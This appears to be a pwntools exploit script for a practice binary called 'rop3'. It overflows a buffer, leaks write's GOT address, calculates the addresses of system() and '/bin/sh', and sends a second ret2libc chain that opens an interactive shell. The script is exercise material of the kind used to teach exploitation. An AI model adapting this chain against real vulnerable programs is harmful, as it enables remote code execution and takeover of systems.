#-*- coing : utf-8 -*-
from pwn import *

p = process(["./rop3"])
write_plt = p32(0x0804830c)
write_got = p32(0x08049614)
OEP = p32(0x08048340)
offset_write = 0xf7ef4460
offset_system = 0xf7e57310
#addr_system = leak_write - (offset_write - offset_system)
offset_binsh = 0xf7f79d4c 
#addr_binsh = leadk_write + (offset_binsh - offset_write)

payload = "a"*140
payload += write_plt
payload += OEP
payload += p32(1)
payload += write_got
payload += p32(4)

p.sendline(payload)
pause()


leak_write = u32(p.recv(4))

print hex(leak_write)
sleep(0.4)


addr_system = leak_write - (offset_write - offset_system)
addr_binsh = leak_write + (offset_binsh - offset_write)

payload2 = "a"*140
payload2 += p32(addr_system)
payload2 += "a"*4
payload2 += p32(addr_binsh)
sleep(0.4)
p.sendline(payload2)
sleep(0.4)
#print p.recv()
p.interactive()



